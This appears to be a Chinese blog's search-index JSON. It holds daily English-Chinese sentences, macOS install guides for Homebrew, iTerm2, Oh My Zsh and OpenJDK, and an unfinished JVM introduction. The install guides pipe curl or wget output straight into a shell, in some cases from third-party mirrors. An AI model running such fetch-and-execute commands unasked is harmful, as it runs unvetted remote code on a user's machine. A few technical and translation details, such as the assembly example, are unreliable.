[{"title":"Hello World","url":"/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n<!-- more -->\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","categories":["Hello World"],"tags":["Hello World"]},{"title":"欧陆词典每日一句-2020年09月","url":"//eudic-2020-09/","content":"\n> There is nothing permanent except change. 盖将自其变者而观之，则天地曾不能以一瞬。\n\n<!-- more -->\n\n- Don't let the noise of other's opinion drown out your own inner voice. 不要让别人的意见淹没了你自已内心的声音。\n\n- Without you, without the affectionate hand you extended to the small poor child that I was, without your teaching and example, none of this would have happened. 如果没有您，如果不是您用慈爱的手抚慰我这个可怜的小孩，如果不是您的谆谆教诲和以身作则，这一切的一切都无从谈起。\n\n- It's nothing that a gallant girl can't handle. 没有勇敢的女孩做不了的事情。\n\n- End of sermon. As Buddha says: live like a mighty river. 说教到此就告一段落。正如佛陀所言：像一条浩荡的河流般生活。\n\n- I've seen a thousand moons: harvest moons like gold coins, winter moons as white as ice chips, new moons like baby swans' feathers. 我看过无数次月亮：满月如金币，寒月洁白似冰屑，新月宛如小天鹅的羽毛。\n\n- Learning another language gives the learner the ability to step inside the mind and context of that other culture. 学习外语能让学习者深入到异域文化的里层。\n\n- Home is the place in the world that totally belongs to you. 家是一个完全属于你自己的地方。\n\n- The first in time and the first in importance of the influences upon the mind is that of nature. 在所有对头脑的影响中，大自然的影响可谓在时间上最先，在作用上最为重要。\n\n- As the saying goes, a friend in need is a friend indeed. 老话说，患难见真情。\n\n- So take this new opportunity to look about and fill your lungs with that fantastic land, while it and you are still there. 所以趁现在这个机会四处看看，趁你还站在那片土地上，尽情地呼吸吧。\n\n- An individual human existence should be like a river — small at first, narrowly contained within its banks, and rushing passionately. 一个人的存在应该像一条河流：起初很小，被紧紧地夹在两岸中间，接着热情地奔走。\n\n- Money means a win-win situation for me and the others. 金钱意味着能为我和其他人带来双赢。\n\n- Music is life. What would this world be without good music? No matter what kind it is. 音乐就是生活。这个世界如果没有好音乐会成什么样子呢？不论哪类音乐都是如此。\n\n- I prefer to take my time and enjoy the scenery along the way. 我喜欢花些时间享受沿途的风景。\n\n- If the land is destined to form the hills again, let real human beings learn to choose the higher ground. 如果陆地注定要上升，就让人类重新选择生存的峰顶。\n\n- And the only thing people regret is that they don't live boldly enough, that they don't invest enough heart, didn't love enough. 人们唯一遗憾的是，他们没有足够勇敢地生活，没有投入足够的心力，爱得不够铭心刻骨。\n\n- You have to be abroad, you have to be hermetically sealed off from your intimates, from your home to realize what a gift this going home is. 只有远在海外漂泊，彻底与亲朋挚友切断联系才懂得回家是怎样的幸福。\n\n- I don't think it's reliable to judge a person by the first glance. 我认为不能依靠第一印象来判断一个人。\n\n- And don't be afraid of the dark. 不要惧怕黑暗。\n\n- The whole art of knowledge is only the art of awakening the natural curiosity of young minds for the purpose of satisfying it afterwards. 教育的全部艺术，就是将幼小心灵中天生的好奇心唤醒，以便在日后使其满足。\n\n- Happiness is a butterfly, which when pursued, is always just beyond your grasp, but which, if you will sit down quietly, may alight upon you. 幸福有如蝴蝶，你追逐它时永远捉不到，你静坐下来，它却可能落在你身上。\n\n- There is nothing permanent except change. 唯有变化才是永恒的。（盖将自其变者而观之，则天地曾不能以一瞬）\n\n- If 1000 challengers are under your feet, count me as the challenger 1001. 纵使你脚下有一千名挑战者，那就把我算作第一千零一名。\n\n- If the sea is doomed someday to break its levees, my heart must flood with all the bitter waters. 如果海洋注定要决堤，就让所有的苦水都注入我心中。\n\n- A good friend should be willing to help you when you are in trouble, comfort you when you are frustrated. 一个好朋友应该会在你困难时候拉一把，在你沮丧时给个肩膀依靠。\n\n- What is glory without virtue? 如果没有美德，荣耀又算得了什么呢？\n\n- Live your life with passion, with some drive! 用激情来点燃你的生活，积极地面对一切！\n\n- Education is more valuable than money, in the long run. 从长远来看，教育比金钱更有价值。\n\n- Good negotiators learn fast. Poor negotiators remain like that and go on losing negotiations. 优秀的谈判者学习得很快。拙劣的谈判者保持现状，并且谈判会继续失利。\n\n- Don't be too concerned with the opinions of others. 不要太在意别人的意见。","categories":["学英语"],"tags":["英语","学英语","欧陆词典","每日一句"]},{"title":"欧陆词典每日一句-2020年10月","url":"//eudic-2020-10/","content":"\n> It's time in which we are directed by the needs and desires of others, and denied the right to make our own choices. 这个时代，我们受他人的需求和欲望支配，反而剥夺了自己做出选择的权利。\n\n---\n\n- Volunteers are teenagers and adults who choose to spend some time, unpaid, helping other people in some way. 志愿者是选择花费时间，不求酬劳以某种方式帮助他人的青少年或者是成年人。\n\n- Aim high but within reason. 要有雄心，但也要理性。\n\n<!-- more -->\n\n- It's important to prepare for your trip in advance and to take precautions while you are travelling. 提前为你的旅行做好准备，在旅行的时候警惕点，很重要。\n\n- Everything is going according to plan. 一切都照计划进行着。\n\n- The main measure of economic progress is the gross national product(GNP). 经济增长主要的衡量标准是国民生产总值（GNP）。\n\n- Dance expresses love and hate, joy and sorrow, life and death, and everything else in between. 舞蹈能表达爱与恨，快乐与忧愁，生存和死亡，以及一切的一切。\n\n- If you are a college student looking for a part-time job, the best place to start your job search is right on campus. 如果你是一名正在找兼职工作的大学生，那么开始找工作的最好地点就是在学校。\n\n---\n\n- What have been the main challenges and opportunities that you have faced? 你面临的主要挑战和机遇是什么？\n\n- I guess I should recognize my mistakes and learn the lesson they teach me and move forward. 我想我应该认识到自己的错误，从中汲取教训，然后继续前进。\n\n- My rich dad taught me a lesson I have carried all my life and that was the necessity of being charitable or giving. 富爸爸教给我一生受用的经验，即乐善好施是必要的。\n\n- Working in a team can have huge benefits. 在团队中工作可以带来巨大的好处。\n\n- Buckle up in every seat, on every trip, every time. 交通出行必系安全带。\n\n- Be sure to attend all classes and leave enough time to finish your assignments and prepare well for examinations. 一定要参加所有的课程，留下足够的时间完成你的作业，好好准备考试。\n\n- Most people know Marie Curie was the first woman to win the Nobel Prize and the first person to win it twice. 大多数人都知道玛丽·居里是第一位获得诺贝尔奖的女性，同时也是第一位两次获得诺贝尔奖的女性。\n\n---\n\n- Even after all these years, I want to get better and better. 即使经过这么多年，我还是想做到精益求精。\n\n- My heart is full of many things to say to you. 我心里装满了要向你倾诉的话。\n\n- I guess living on campus, I'll have a chance to have a closer circle of friends since we'll be living together. 我想，进入校园生活后，我们会住在一起，我就有机会结交一些更亲密的好友。\n\n- People who enjoy extreme sports actually seek out danger—it gives them extreme pleasure! 享受极限运动的人追求危险——这会给他们带来极度快感！\n\n- Your journey forward will not always be easy. 你的前途未必总是一帆风顺。\n\n- I really appreciate this. Thanks for your help. 我对此很感激。感谢你的帮助。\n\n- Regular physical activity helps maintain a healthy weight and can prevent some chronic diseases. 定期体育活动有助保持健康体重，避免慢性疾病产生。\n\n---\n\n- Philanthropy is a growing movement, a lot more can be done. 慈善是一项不断发展的事业，还有很多事情可以去完成。\n\n- In college, time is scarce, and consequently, very precious. 在大学里，时间很少，因此非常宝贵。\n\n- Overconcern with being perfect can damage our confidence if we never achieve it. 如果我们最终没法变得完美，对它过于追求反而会有损我们的自信心。\n\n- Allow me to introduce myself. 请允许我自我介绍一下。\n\n- I really want to push harder and progress further. 我真的希望更加努力，取得更大的进步。\n\n- It's a long way, but I think you'll have a good time. 路途很长，但我觉得你会度过一段美好的时光。\n\n- As he got in the habit of hard work, his grades began to soar. 随着他养成刻苦学习的习惯，他的成绩开始飙升。\n\n---\n\n- There is lots of snow around, and the ground freezes, which can make life difficult for animals. 到处都是积雪，大地被冰封，这让动物们的生活变得艰难。\n\n- Sleeping better may help fight off illness. 好的睡眠能够抵御疾病。\n\n- It's time in which we are directed by the needs and desires of others, and denied the right to make our own choices. 这个时代，我们受他人的需求和欲望支配，反而剥夺了自己做出选择的权利。\n","categories":["学英语"],"tags":["英语","学英语","欧陆词典","每日一句"]},{"title":"欧陆词典每日一句-2020年11月","url":"//eudic-2020-11/","content":"\n> I have to make a difficult choice. Decide quickly. 我必须做一个艰难的选择。那就是迅速做出决定。\n\n---\nIf I were you, I wouldn't worry about it. 如果我是你，我不会为此而担忧。\n\nThey worked hard at whatever they did, but they had a sense of achievement. 无论做什么，他们都很努力，有一种成就感。\n\nA company should find ways to innovate not just in products but also in functions, business models and processes. 一个公司要寻求的不仅仅是产品创新，还应寻求运营、商业模式和流程方面的创新。\n\n<!-- more -->\nI just trust that the principle of reciprocity is true, and I give what I want. 我相信互利互惠的原则，我想要得到就要付出。\n\nMost successful people are unorthodox persons whose minds wander outside traditional ways of thinking. 大多数成功的人都并非遵循传统之人，他们的思维方式都游离在传统的思维方式之外。\n\nCurriculums — from grammar school to college, should evolve to focus less on memorizing facts and more on creativity and complex communication. 从语法学校到大学的课程，都应该逐渐发展，更多地注重创新和复杂的交流，而不是把重点放在记忆事实上。\n\nGradually it became dark outside. The rain was still beating on the windows, and I could hear the wind in the trees. 外面的天渐渐黑了。雨点仍然拍打着窗户，还可以听到风在树枝间呼啸。\n\n---\n\nAlmost all companies recognize the importance of innovation today. 如今，几乎所有的公司都知道创新的重要性。\n\nI wish you well. You have my best wishes. 我祝福你。向你致以最好的祝愿。\n\nToo much happiness can be destructive. 乐极也会生悲。\n\nIf you can speak the language, it's easier to get to know the country and its people. 如果会说当地语言，了解这个国家和人民就会更加容易。\n\nTruly my favorite part is to see the kids jumping up and down and they just get so excited. 我最喜欢的就是看着孩子们兴奋地蹦蹦跳跳。\n\nPeople are curious by nature. 人类天性好奇。\n\nThey believed in goodness, in community, and helping one another. 他们信仰美德，信仰团体，信仰互助。\n\n---\n\nIn my line of work, I receive a lot of emails. I also send a lot of emails. 在我的职业生涯中，我收到过不少电子邮件，也发出去不少。\n\nYour joy for life, transmitted wherever you took your smile, and the sparkle in those unforgettable eyes. 你对生活的欣喜，通过你的微笑和你令人难忘的双眸中的闪光，传遍了你的所到之处。\n\nUse your voice to speak out for what's right. 用你的影响力去为正义发声。\n\nAll kinds of myths surround the lives of well-known people. 名人的生活总是被各种各样的荒诞故事所围绕。\n\nDemand is rising rapidly, because of the world's increasing population and expanding industry. 需求量正在激增，因为整个世界人口急剧增长，工业规模不断扩大。\n\nIf I could go back in history and live when I liked, I wouldn't go back very far. 如果我能回到过去并生活在我喜欢的年代，我不会选很久以前。\n\nYou might imagine the job you will get when you finish school. 你可能会设想自己毕业后从事的工作。\n\n---\n\nWe often use slang expressions when we talk, because they are so vivid and colorful. 我们说话时会经常使用俚语，因为俚语很生动、很丰富多彩。\n\nYou need to recognize each step of progress you take towards achieving your goals. 你成功路上的每一点进步都值得自己的认可。\n\nWith a lot of hard work and a good education, anything is possible. 只要你愿意努力工作，努力接受教育，任何事情都是可能的。\n\nThink of an email as a letter. Spelling, grammar and punctuation should not be overlooked. 把编辑电子邮件当成在写信，拼写、语法、标点都不应忽视。\n\nThe ability to work well with others and collaborate on projects is a sought-after ability in nearly every position. 对于任何职位，与他人保持良好的合作关系，可以进行有效的项目合作，这些对职场人来说都是倍受追捧的能力。\n\nI like to collect bits and pieces from different parts of the world. 我喜欢在世界各地搜集点点滴滴的东西。\n\nI have to make a difficult choice. Decide quickly. 我必须做一个艰难的选择。那就是迅速做出决定。\n\n---\n\nA well-organized essay will group similar ideas together and put them in the proper order. 一篇条理清晰的文章会把相似的观点组织在一起，并按适当的顺序排列。\n\nWherever you go and for whatever reason, it's important to be safe. 不论你去哪，因为什么原因，安全都很重要。\n\n","categories":["学英语"],"tags":["英语","学英语","欧陆词典","每日一句"]},{"title":"如何安装 Homebrew？","url":"/install/install-homebrew/","content":"\n## Homebrew 是什么？\n\nHomebrew是一款自由及开放源代码的软件包管理系统，用以简化macOS系统上的软件安装过程，最初由马克斯·霍威尔（Max Howell）写成。因其可扩展性得到了一致好评，而在Ruby on Rails社区广为人知。\n\nHomebrew使用GitHub，通过用户的贡献扩大对软件包的支持。2012年，Homebrew是GitHub上拥有最多新贡献者的项目。2013年，Homebrew同时成为GitHub上最多贡献者及最多已关闭问题的项目。\n\n## 相关网站\n\n官网：https://brew.sh/\n\n官方GitHub仓库：https://github.com/Homebrew/brew\n\n官方GitHub安装脚本：https://github.com/Homebrew/install\n\n国内定制安装脚本：https://gitee.com/cunkai/HomebrewCN\n\n<!-- more -->\n\n## 安装\n\n官方的安装方法：\n\n```\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\"\n```\n\n国内定制的安装脚本：\n\n```\n/bin/bash -c \"$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)\"\n```\n\n## 可能遇到的问题\n\n如果是新手可能会遇到git没有安装的问题，一般情况只需要按照提示安装就可以了，但是也有例外，当出现\n\n> 不能安装该软件，因为当前无法从软件更新服务器获得。\n\n![25-12-19-截屏2020-09-25下午12.15.04-yOZ7xD](https://up-img.yonghong.tech/pic/2020/09/25-12-19-%E6%88%AA%E5%B1%8F2020-09-25%20%E4%B8%8B%E5%8D%8812.15.04-yOZ7xD.png)\n\n这种情况时，也不用慌，打开 https://developer.apple.com/ 网站，下载 Command Line Tools 安装就可以了。\n\n![25-12-19-截屏2020-09-25下午12.16.21-OZrMBN](https://up-img.yonghong.tech/pic/2020/09/25-12-19-%E6%88%AA%E5%B1%8F2020-09-25%20%E4%B8%8B%E5%8D%8812.16.21-OZrMBN.png)\n\n## 相关链接\n\n- [如何安装 iTerm2？](/install/install-iterm2/)\n- [如何安装 Oh My Zsh？](/install/install-oh-my-zsh/)","categories":["安装"],"tags":["安装","Install","Homebrew","brew","mirror","镜像"]},{"title":"如何安装 iTerm2？","url":"/install/install-iterm2/","content":"\n## iTerm2 是什么？\n\niTerm2 是终端仿真程序 iTerm 的替代品，支持 Mac OS 10.5 以及以上的版本。\n\n简单来说就是一款漂亮的终端程序。\n\n感受一下网友们配置的主题：\n\n![iTerm2 + Oh My Zsh](https://up-img.yonghong.tech/pic/2020/09/25-14-42-BwYsU5-FbqgAm.jpg)\n\n<!-- more -->\n\n## 官方网站\n\n官方网站：https://www.iterm2.com/\n\n官方GitHub仓库：https://github.com/gnachman/iTerm2\n\n## 安装\n\n### 从官网下载安装\n\nhttps://iterm2.com/downloads/stable/latest\n\n### 用 Homebrew 安装\n\n```\nbrew cask install iterm2\n```\n\nHomebrew 的安装参考 [如何安装 Homebrew？](/install/install-homebrew/)\n\n## 参考链接\n\n- [iTerm2 + Oh My Zsh 打造舒适终端体验](https://segmentfault.com/a/1190000014992947)\n- [如何安装 Homebrew？](/install/install-homebrew/)\n- [如何安装 Oh My Zsh？](/install/install-oh-my-zsh/)","categories":["安装"],"tags":["安装","Install","Homebrew","brew","iTerm2？"]},{"title":"如何安装 Oh My Zsh？","url":"/install/install-oh-my-zsh/","content":"\n## Oh My Zsh 是什么？\n\nOh My Zsh 是一个令人愉快的，开源的，社区驱动的框架，用于管理您的 Zsh 配置。它捆绑了成千上万的有用功能，助手，插件，主题以及一些让您大喊大叫的东西... \n\n> \"Oh My ZSH!\"\n\niTerm2 + Oh My Zsh 这个组合可以创造出无限可能，感受一下网友们配置的主题：\n\n![iTerm2 + Oh My Zsh](https://up-img.yonghong.tech/pic/2020/09/25-14-42-BwYsU5-FbqgAm.jpg)\n\n<!-- more -->\n\n## 安装\n\n### 官方安装方法\n\n```shell\nsh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n# 或者\nsh -c \"$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n```\n\n### Gitee镜像仓库安装方法\n\n```shell\nREMOTE=https://gitee.com/mirrors/oh-my-zsh.git sh -c \"$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)\"\n# 或者\nREMOTE=https://gitee.com/mirrors/oh-my-zsh.git sh -c \"$(wget -O- https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)\"\n```\n\n## 相关链接\n\n- [如何安装 Homebrew？](/install/install-homebrew/)\n- [如何安装 iTerm2？](/install/install-iterm2/)","categories":["安装"],"tags":["安装","Install","mirror","镜像","Oh My Zsh","oh-my-zsh"]},{"title":"如何在 macOS 上安装 OpenJDK/AdoptOpenJDK？","url":"/install/install-openjdk-on-macos/","content":"\n[OpenJDK](https://openjdk.java.net/) 是一个标准，[AdoptOpenJDK](https://adoptopenjdk.net/) 是其中的一个比较常用的实现版本，它由 Java User Group (JUG) 成员、Java 开发者以及一些公司（包含亚马逊、GoDaddy、IBM、微软、Pivotal、红帽等）共同维护，AdoptOpenJDK 提供了同时提供了基于 Hotspot 和 OpenJ9 的版本，IBM 是 OpenJ9 的核心贡献者。本文将会讲解几种在 macOS 上安装 OpenJDK/AdoptOpenJDK 的方法。\n\n<!-- more -->\n\n## 查看自己电脑上安装了哪些Java版本\n\n使用 `/usr/libexec/java_home -V` 命令查看自己电脑上安装的Java版本。\n\n比如说我的电脑，我安装了好几个版本，有三个 AdoptOpenJDK 和两个 Oracle JDK。默认情况下会使用 adoptopenjdk-14.jdk。\n\n```shell\n/usr/libexec/java_home -V\nMatching Java Virtual Machines (5):\n    14.0.2, x86_64:\t\"AdoptOpenJDK 14\"\t/Library/Java/JavaVirtualMachines/adoptopenjdk-14.jdk/Contents/Home\n    11.0.8, x86_64:\t\"AdoptOpenJDK 11\"\t/Library/Java/JavaVirtualMachines/adoptopenjdk-11.jdk/Contents/Home\n    11.0.7, x86_64:\t\"Java SE 11.0.7\"\t/Library/Java/JavaVirtualMachines/jdk-11.0.7.jdk/Contents/Home\n    1.8.0_252, x86_64:\t\"AdoptOpenJDK 8\"\t/Library/Java/JavaVirtualMachines/adoptopenjdk-8.jdk/Contents/Home\n    1.8.0_221, x86_64:\t\"Java SE 8\"\t/Library/Java/JavaVirtualMachines/jdk1.8.0_221.jdk/Contents/Home\n\n/Library/Java/JavaVirtualMachines/adoptopenjdk-14.jdk/Contents/Home\n```\n\n## 使用 jenv 管理 JDK 版本\n\njenv 是一个管理java版本的命令行工具，可以轻松的帮你配置 JAVA_HOME。\n\n官网 https://www.jenv.be/\n\nGitHub 代码仓库 https://github.com/jenv/jenv\n\n安装也十分简单，官网上有，不多介绍。\n\n```shell\nbrew install jenv\n\n# 如果使用bash\necho 'export PATH=\"$HOME/.jenv/bin:$PATH\"' >> ~/.bash_profile\necho 'eval \"$(jenv init -)\"' >> ~/.bash_profile\n\n# 如果使用zsh\necho 'export PATH=\"$HOME/.jenv/bin:$PATH\"' >> ~/.zshrc\necho 'eval \"$(jenv init -)\"' >> ~/.zshrc\n\n# 把Java各个版本添加到jenv\njenv add /Library/Java/JavaVirtualMachines/adoptopenjdk-8.jdk/Contents/Home\njenv add /Library/Java/JavaVirtualMachines/adoptopenjdk-11.jdk/Contents/Home\n\n# 查看版本\njenv versions\n\n# 切换Java版本\njenv local 11.0\njenv global 11.0\n```\n\n\n## 下载安装包手动安装\n\n鉴于官方的安装包在GitHub上托管，下载起来非常不便，因此这里使用清华的镜像 TUNA。\n\n下载地址：\n\n{% tabs OpenJDK 下载地址, 3 %}\n<!-- tab 全部 -->\nhttps://mirrors.tuna.tsinghua.edu.cn/AdoptOpenJDK/\n<!-- endtab -->\n\n<!-- tab Java 8 -->\njdk https://mirrors.tuna.tsinghua.edu.cn/AdoptOpenJDK/8/jdk/x64/mac/\n\njre https://mirrors.tuna.tsinghua.edu.cn/AdoptOpenJDK/8/jre/x64/mac/\n<!-- endtab -->\n\n<!-- tab Java11 -->\njdk https://mirrors.tuna.tsinghua.edu.cn/AdoptOpenJDK/11/jdk/x64/mac/\n\njre https://mirrors.tuna.tsinghua.edu.cn/AdoptOpenJDK/11/jre/x64/mac/\n<!-- endtab -->\n{% endtabs %}\n\n打开之后下载哪个呢？如果你不知道要下载哪个，你就下载 Hotspot 的 pkg 文件。\n\n下载之后，双击就可以安装了。\n\n## 使用 Homebrew 安装\n\nHomebrew 是一个非常好用的工具，官网 https://brew.sh/\n\n可以参考 [如何安装 Homebrew？](/install/install-homebrew/)\n\n### 官方的 Homebrew Tap\n\nhttps://github.com/AdoptOpenJDK/homebrew-openjdk\n\n官方维护了一个 Homebrew Tap，已经很方便了，美中不足是他提供的下载链接是托管在GitHub上的，下载非常慢，所以我建议使用下面笔者维护的 Tap wangyonghong/openjdk-mirror。\n\n如果你的网速还可以，那么使用官方的就足够了。\n\n```shell\nbrew tap AdoptOpenJDK/openjdk\n\nbrew search openjdk\n\nbrew cask install adoptopenjdk11\nbrew cask uninstall adoptopenjdk11\n```\n\n### wangyonghong/openjdk-mirror\n\nhttps://github.com/wangyonghong/homebrew-openjdk-mirror\n\n笔者维护的这个 Tap，JDK 的下载链接是来自清华的镜像 TUNA，和上面的手动下载安装的地址是一样的。\n\n用法相同\n\n```shell\nbrew tap wangyonghong/openjdk-mirror\n\nbrew search openjdk\n\nbrew cask install tuna-adoptopenjdk8\nbrew cask uninstall tuna-adoptopenjdk8\n```\n\n如果这个工具用着有什么问题，欢迎来GitHub上提[issue](https://github.com/wangyonghong/homebrew-openjdk-mirror/issues)。\n\n## 参考链接\n\n- [如何安装 Homebrew？](/install/install-homebrew/)\n- [如何安装 iTerm2？](/install/install-iterm2/)\n- [如何安装 Oh My Zsh？](/install/install-oh-my-zsh/)","categories":["安装"],"tags":["安装","Install","Homebrew","OpenJDK","AdoptOpenJDK","JDK","Java"]},{"title":"Java 进阶 01 —— 5 分钟回顾一下 Java 基础知识","url":"/java-advance/01-jvm-basic/","content":"\n## Java 生态圈\n\nJava 是目前应用最为广泛的软件开发平台之一。随着 Java 以及 Java 社区的不断壮大，Java 也早已不再是简简单单的一门计算机语言了，它更是一个平台、一种文化、一个社区。\n\n- 作为一个平台：Java 虚拟机扮演着举足轻重的作用。\n  - Groovy、Scala、JRuby、Kotlin 等都是 Java 平台的一部分。\n- 作为一种文化：Java 几乎成为了开源的代名词\n  - 第三方开源软件和框架，如，Tomcat、Struts、MyBatis、Spring 等\n  - 就连 JDK 和 JVM 自身也有不少开源的实现，如 OpenJDK、Harmony\n- 作为一个社区，Java 拥有全世界最多的技术拥护者和开源社区的支持，有数不清的论坛和资料。从桌面应用软件、嵌入式开发到企业级应用、后台服务器、中间件，都可以看到 Java 的身影。其应用形式之复杂、参与人数之众也令人咋舌。\n\n<!-- more -->\n\n## Java 跨平台的语言\n\n### Java 虚拟机规范\n\nThe Java Virtual Machine is the cornerstone of the Java platform. **It is the component of the technology responsible for its hardware- and operating system-independence**, the small size of its compiled code, and its ability to protect users from malicious programs.\n\nThe Java Virtual Machine is an abstract computing machine. Like a real computing machine, it has an instruction set and manipulates various memory areas at run time. It is reasonably common to implement a programming language using a virtual machine; the best-known virtual machine may be the P-Code machine of UCSD Pascal.\n\n### JVM 跨语言的平台\n\n随着 Java 7 的正式发布，Java 虚拟机的设计者们通过 JSR-292 规范基本实现在 Java 虚拟机平台上运行非 Java 语言编写的程序。\n\nJava 虚拟机根本不关心运行在其内部的程序到底是使用何种编程语言编写的，它只关心“字节码”文件。也就是说，Java 虚拟机拥有语言无关性，并不会单纯地与 Java 语言“终身绑定”，只要其他编程语言的编译结果满足并包含 Java 虚拟机的内部指令集，符号表以及其他的辅助信息，他就是一个有效的字节码文件，就能够被虚拟机所识别并装载运行。\n\n![Java 跨平台的语言](https://up-img.yonghong.tech/pic/2021/04/03-19-34-orUTHy-CAZ1Zb.png)\n\n![源码跨平台和二进制跨平台](https://up-img.yonghong.tech/pic/2021/04/02-19-40-%E6%BA%90%E7%A0%81%E8%B7%A8%E5%B9%B3%E5%8F%B0%E5%92%8C%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%B7%A8%E5%B9%B3%E5%8F%B0-R6Uzxy.png)\n\n- Java、C++、Rust 的区别\n  - C/C++ 完全相信而且惯着程序员，让大家自行管理内存，可以编写很自由的代码，但一 不小心就会造成内存泄漏等问题，导致程序崩溃。\n  - Java/Golang 完全不相信程序员，但也惯着程序员。所有的内存生命周期都由 JVM 运行 时统一管理。 在绝大部分场景下，你可以非常自由的写代码，而且不用关心内存到底是 什么情况。 内存使用有问题的时候，我们可以通过 JVM 来进行信息相关的分析诊断和 调整。 这也是本课程的目标。\n  - Rust 语言选择既不相信程序员，也不惯着程序员。 让你在写代码的时候，必须清楚明白 的用 Rust 的规则管理好你的变量，好让机器能明白高效地分析和管理内存。 但是这样 会导致代码不利于人的理解，写代码很不自由，学习成本也很高。\n\n### 多语言混合编程\n\nJava 平台上的多语言混合编程正在成为主流，通过特定领域的语言去解决特定领域的问题是当前软件开发应对日趋复杂的项目需求的一个方向。\n\n试想一下，在一个项目之中，并行处理使用 Clojure 语言编写，展示层使用 JRuby/Rails，中间层则是 Java，每个应用层都将使用不同的编程语言来完成，而且，接口对每一层开发者都是透明的，各种语言之间的交互不存在任何困难，就像使用自己语言的原生 API 一样方便，因为他们最终都运行在一个虚拟机之上。\n\n对于这些运行在虚拟机之上、Java 语言之外的语言，来自系统级的、底层的支持正在迅速增强，以 JSR-292 为核心的一系列项目和功能改进（如，Davinci Machine 项目、Nashorn 引擎、InvokeDynamic 指令、java.lang.invoke 包等），推动 Java 虚拟机从 Java 语言的虚拟机向多语言虚拟机发展。\n\n### 两种架构\n\nJava 编译器输入的指令流基本上是一种基于栈的指令集架构，另外一种指令集架构则是基于寄存器的指令集架构。\n\n具体来说两种架构之间的区别：\n\n- 基于栈式架构的特点\n  - 设计和实现更简单，适用于资源受限的系统；\n  - 避开了寄存器的分配难题：使用零地址指令方式分配；\n  - 指令流中的指令大部分是零地址指令，其执行过程依赖于操作数。指令集更小，编译器容易实现；\n  - 不需要硬件支持，可移植性更好，更好实现跨平台。\n- 基于寄存器架构的特点\n  - 典型的应用是 x86 的二进制指令集：比如传统的 PC 以及 Android 的 Davlik 虚拟机；\n  - 指令集架构则完全依赖硬件，可移植性差；\n  - 性能优秀和执行更高效；\n  - 花费更少的指令去完成一项操作；\n  - 在大部分情况下，基于寄存器架构的指令集往往都是一地址指令、二地址指令和三地址指令为主，而基于栈式架构的指令集却是以零地址指令为主。\n\n#### 举例\n\n同样执行 2+3 这种逻辑操作，其指令分别如下：\n\n基于栈的计算流程（以 Java 虚拟机为例）：\n\n```java\niconst_2 // 常量 2 入栈\nistore_1\niconst_3 // 常量 3 入栈\nistore_2\niload_1\niload_2\niadd     // 常量 2、3 出栈，执行相加\nistore_0 // 结果 5 入栈\n```\n\n而基于寄存器的计算流程\n\n```java\nmov eax,2  // 将 eax 寄存器的值设置为 2\nmov eax,3  // 使 eax 寄存器的值加 3\n```\n\n代码演示一下\n\n```java\npublic class StackStruTest {\n    public static void main(String[] a) {\n        int i = 2 + 3;\n    }\n}\n```\n\n```shell\ncd chapter_01\njavac StackStruTest.java\njavap -v StackStruTest\nClassfile /Users/yonghong/Coding/jvm/song/chapter_01/StackStruTest.class\n  Last modified 2020-11-17; size 277 bytes\n  MD5 checksum 9a7da6f68b8101238c5ab826d90154c5\n  Compiled from \"StackStruTest.java\"\npublic class StackStruTest\n  minor version: 0\n  major version: 52\n  flags: ACC_PUBLIC, ACC_SUPER\nConstant pool:\n   #1 = Methodref          #3.#12         // java/lang/Object.\"<init>\":()V\n   #2 = Class              #13            // StackStruTest\n   #3 = Class              #14            // java/lang/Object\n   #4 = Utf8               <init>\n   #5 = Utf8               ()V\n   #6 = Utf8               Code\n   #7 = Utf8               LineNumberTable\n   #8 = Utf8               main\n   #9 = Utf8               ([Ljava/lang/String;)V\n  #10 = Utf8               SourceFile\n  #11 = Utf8               StackStruTest.java\n  #12 = NameAndType        #4:#5          // \"<init>\":()V\n  #13 = Utf8               StackStruTest\n  #14 = Utf8               java/lang/Object\n{\n  public StackStruTest();\n    descriptor: ()V\n    flags: ACC_PUBLIC\n    Code:\n      stack=1, locals=1, args_size=1\n         0: aload_0\n         1: invokespecial #1                  // Method java/lang/Object.\"<init>\":()V\n         4: return\n      LineNumberTable:\n        line 2: 0\n\n  public static void main(java.lang.String[]);\n    descriptor: ([Ljava/lang/String;)V\n    flags: ACC_PUBLIC, ACC_STATIC\n    Code:\n      stack=1, locals=2, args_size=1\n         0: iconst_5 // 直接返回了 5\n         1: istore_1\n         2: return\n      LineNumberTable:\n        line 4: 0\n        line 5: 2\n}\nSourceFile: \"StackStruTest.java\"\n```\n\n由于跨平台的设计，Java 的指令都是根据栈来设计的。不同平台 CPU 架构不同，所以不能设计为基于寄存器的。优点是跨平台、指令集小，编译器容易实现；缺点是性能下降，实现同样的功能需要更多的指令。\n\n时至今日，尽管嵌入式平台已经不是 Java 程序的主流运行平台了（准确来说是 HotSpot 虚拟机的宿主环境已经不局限于嵌入式平台了），那么为什么不将架构更换为基于寄存器的架构呢？\n\n答：基于栈式架构的虚拟机跨平台、指令集小，编译器容易实现，在非资源受限的场景中也是可以使用的。\n\n## JVM 的生命周期\n\n### 虚拟机的启动\n\nJava 虚拟机的启动时通过引导类加载器（bootstrap class loader）创建一个初始类（initial class）来完成的，这个类是由虚拟机的具体实现指定的。\n\n### 虚拟机的执行\n\n- 一个运行中的 Java 虚拟机有着一个清晰的任务：执行 Java 程序；\n- 程序开始执行时他才运行，程序结束时他就停止；\n- 执行一个所谓的 Java 